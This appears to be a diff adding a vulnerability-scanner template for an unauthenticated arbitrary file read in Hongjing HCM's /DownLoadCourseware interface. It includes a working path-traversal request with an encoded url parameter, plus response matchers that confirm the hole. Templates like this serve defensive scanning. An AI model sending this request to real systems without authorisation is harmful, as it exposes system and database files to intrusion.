@@ -1,0 +1,32 @@
+id: hjsoft-hcm-lfi
+brief:
+    title: Hongjing HCM - Local File Inclusion
+    by: s4e-io
+    level: high
+    about: There is an arbitrary file read vulnerability in the Hongjing eHR /DownLoadCourseware interface. Unauthenticated attackers can use this vulnerability to read important system files (such as databas...
+    label:
+        - lfi
+        - hjsoft
+        - management-system
+        - file-read
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
+        - "on": word
+          has:
+            - multipart/form-data
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
